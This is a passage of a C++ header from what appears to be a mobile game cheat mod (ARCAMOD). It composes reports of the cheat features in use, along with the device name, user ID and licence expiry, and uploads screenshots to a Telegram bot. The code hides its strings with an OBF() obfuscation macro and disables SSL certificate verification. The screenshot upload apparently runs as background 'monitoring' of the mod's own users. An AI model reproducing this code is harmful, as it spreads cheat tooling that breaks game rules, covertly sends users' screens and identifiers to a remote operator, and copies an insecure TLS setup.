                movementSection += speedBuff;
                hasMovementFeatures = true;
            }
            if (Config.Misc.SkyDiving) {
                char skydivingBuff[128];
                snprintf(skydivingBuff, sizeof(skydivingBuff), OBF("  🪂 Fast Skydiving `%.1fx`\n"), Config.MiscSize.FallSpeed);
                movementSection += skydivingBuff;
                hasMovementFeatures = true;
            }
            if (Config.Misc.Slide) {
                char slideBuff[128];
                snprintf(slideBuff, sizeof(slideBuff), OBF("  🛷 Fast Slide `%.1fx`\n"), Config.MiscSize.Slide);
                movementSection += slideBuff;
                hasMovementFeatures = true;
            }
            if (Config.Misc.Swim) {
                char swimBuff[128];
                snprintf(swimBuff, sizeof(swimBuff), OBF("  🏊 Fast Swim `%.1fx`\n"), Config.MiscSize.Swim);
                movementSection += swimBuff;
                hasMovementFeatures = true;
            }
            if (Config.Misc.SkiingBoost) {
                char skiingBuff[128];
                snprintf(skiingBuff, sizeof(skiingBuff), OBF("  ⛷️ Skiing Boost `%.1fx`\n"), Config.MiscSize.SkiingBoost);
                movementSection += skiingBuff;
                hasMovementFeatures = true;
            }
            if (Config.Misc.Parachute) { movementSection += OBF("  🪂 Parachute Control\n"); hasMovementFeatures = true; }
            if (Config.Misc.Spectate) { movementSection += OBF("  👻 Spectate Mode\n"); hasMovementFeatures = true; }

            if (hasMovementFeatures) {
                caption += OBF("🏃 *Movement Features:*\n") + movementSection;
            }

            // Misc Features dengan emoji
            bool hasMiscFeatures = false;
            std::string miscSection = "";

            // Status FakeStatus (tanpa device compatibility check)
            if (Config.Misc.FakeStatus) {
                miscSection += OBF("  🔒 FakeStatus Active\n");
                hasMiscFeatures = true;
            }

            // SmoothFPS dihapus karena tidak tersedia di menu UI untuk user
            // if (Config.View.SmoothFPS) { miscSection += OBF("  - Better FPS\n"); hasMiscFeatures = true; }
            if (Config.Misc.SmartFPS) { miscSection += OBF("  - Smart FPS\n"); hasMiscFeatures = true; }
            if (Config.Misc.ResourceOptimization) {
                char optBuff[128];
                snprintf(optBuff, sizeof(optBuff), OBF("  - Resource Optimization `%.0f%%`\n"), Config.MiscSize.OptimizationLevel * 100);
                miscSection += optBuff;
                hasMiscFeatures = true;
            }
            if (Config.Misc.Tutorial) { miscSection += OBF("  - Tutorial Mode\n"); hasMiscFeatures = true; }

            if (hasMiscFeatures) {
                caption += OBF("🔧 *Misc Features:*\n") + miscSection;
            }

            // Tambahkan footer dengan timestamp
            caption += OBF("\n📅 *Report Time:* `") + getCurrentTimestamp() + OBF("`\n");
            caption += OBF("🔄 *Status:* `Active & Monitoring`");
        } else {
            // Pada screenshot pertama, tampilkan informasi User ID dan tanggal kedaluwarsa dengan format estetik
            caption = OBF("🎮 *ARCAMOD Initial Report*\n");
            caption += OBF("📱 Device: `") + Config.Init.device_name + OBF("`\n");

            // Tambahkan User ID jika tersedia
            if (Config.UserData.IsLoggedIn && !Config.UserData.UserID.empty()) {
                caption += OBF("👤 User ID: `") + Config.UserData.UserID + OBF("`\n");

                // Tambahkan tanggal kedaluwarsa jika tersedia
                if (Config.UserData.ExpiredUTC > 0) {
                    // Konversi waktu kedaluwarsa ke string yang dapat dibaca
                    char expiredDateStr[64];
                    struct tm *expiredTime = localtime(&Config.UserData.ExpiredLocal);
                    strftime(expiredDateStr, sizeof(expiredDateStr), OBF("%d-%m-%Y"), expiredTime);

                    caption += OBF("⏰ Expires: `") + std::string(expiredDateStr) + OBF("`\n");
                }
            }

            caption += OBF("\n✅ *Status:* `Successfully Connected`\n");

            // Status Security (tanpa device compatibility check)
            if (Config.Misc.FakeStatus) {
                caption += OBF("🔒 *Security:* `FakeStatus Active`\n");
            } else {
                caption += OBF("🔒 *Security:* `FakeStatus Non-Active`\n");
            }

            caption += OBF("📊 *Monitoring:* `Auto Feedback Enabled`\n\n");

            // Tambahkan pesan terima kasih dengan emoji
            caption += OBF("🙏 *Thank you for using ARCAxBYDZ!*\n");
            caption += OBF("⚠️ Please use responsibly and follow game rules.\n\n");

            // Informasi tambahan dengan emoji
            caption += OBF("📸 *Next Report:* Feature usage will be shown in subsequent screenshots\n");
            caption += OBF("📅 *Report Time:* `") + getCurrentTimestamp() + OBF("`");
        }
        
        curl_formadd(&formpost, &lastptr, 
            CURLFORM_COPYNAME, OBF("caption"), 
            CURLFORM_COPYCONTENTS, caption.c_str(), 
            CURLFORM_END);
        
        // Set URL untuk sendPhoto dengan token bot yang diberikan
        std::string url = Config.Telegram.TelegramBotUrl + botToken + OBF("/sendPhoto");
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        
        // Print URL yang digunakan (tanpa token lengkap untuk keamanan)
        // LOGI("[SCREENSHOT] Mengirim ke URL: %s.../*token*/", Config.Telegram.TelegramBotUrl.c_str());
        
        // Set timeout yang lebih panjang (60 detik)
        curl_easy_setopt(curl, CURLOPT_TIMEOUT, 60L);
        curl_easy_setopt(curl, CURLOPT_CONNECTTIMEOUT, 15L);
        
        // Set form data
        curl_easy_setopt(curl, CURLOPT_HTTPPOST, formpost);
        
        // Aktifkan verbose untuk debugging
        curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);
        
        // Nonaktifkan verifikasi SSL (hanya untuk debugging)
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
        
        // Callback untuk response
        std::string response;
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, writeCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
        
        // Tambahkan retry & follow redirections
        curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
        curl_easy_setopt(curl, CURLOPT_MAXREDIRS, 3L);
        
        // Perform request
        bool success = false;
        CURLcode res = curl_easy_perform(curl);
        
        if (res != CURLE_OK) {
            // LOGE("[SCREENSHOT] curl_easy_perform() failed: %s", curl_easy_strerror(res));
        } else {
            // Cek HTTP status code
            long http_code = 0;
            curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);
            
            if(http_code == 200) {
                // LOGI("[SCREENSHOT] HTTP status 200 OK");
                // LOGI("[SCREENSHOT] Response: %s", response.c_str());
                success = true;
            } else {
                // LOGE("[SCREENSHOT] HTTP status error: %ld", http_code);
                // LOGE("[SCREENSHOT] Response: %s", response.c_str());
                
                // Tambahkan analisis error untuk Telegram API
                if (response.find("Bad Request") != std::string::npos) {
                    if (response.find("IMAGE_PROCESS_FAILED") != std::string::npos) {
                        // LOGE("[SCREENSHOT] Telegram tidak dapat memproses gambar. Ukuran atau format mungkin tidak didukung.");
                        
                        // Coba kirim ulang dengan resolusi lebih rendah
                        if (Config.Telegram.ScreenshotResolution > 0) {
                            // LOGI("[SCREENSHOT] Mencoba kirim ulang dengan resolusi lebih rendah pada screenshot berikutnya.");
                            Config.Telegram.ScreenshotResolution = std::max(0, Config.Telegram.ScreenshotResolution - 1);
                            Config.Telegram.ScreenshotQuality = std::min(Config.Telegram.ScreenshotQuality, 75);
                        }
                    } else if (response.find("PHOTO_INVALID_DIMENSIONS") != std::string::npos) {
                        // LOGE("[SCREENSHOT] Dimensi gambar tidak valid untuk Telegram.");
                    }
                }
            }
        }
        
        // Cleanup
        curl_formfree(formpost);
        curl_easy_cleanup(curl);
        curl_global_cleanup();
        
        return success;
    }

    /**
     * Mendapatkan timestamp saat ini dalam format yang dapat dibaca
     * @return String timestamp dalam format "DD-MM-YYYY HH:MM:SS"
     */
    std::string getCurrentTimestamp() {
        time_t now = time(0);
        struct tm *timeinfo = localtime(&now);
        char buffer[64];
        strftime(buffer, sizeof(buffer), "%d-%m-%Y %H:%M:%S", timeinfo);
        return std::string(buffer);
    }

    std::atomic<bool> m_isCapturing; // Flag untuk menandakan proses capture sedang berlangsung
    std::vector<unsigned char> m_screenshotBuffer; // Buffer untuk menyimpan data gambar
    int m_screenshotWidth;  // Lebar screenshot
    int m_screenshotHeight; // Tinggi screenshot
    bool m_isFirstScreenshot; // Flag untuk menandai screenshot pertama
};

#endif // ARCAMOD_SCREENSHOT_FEEDBACK_H 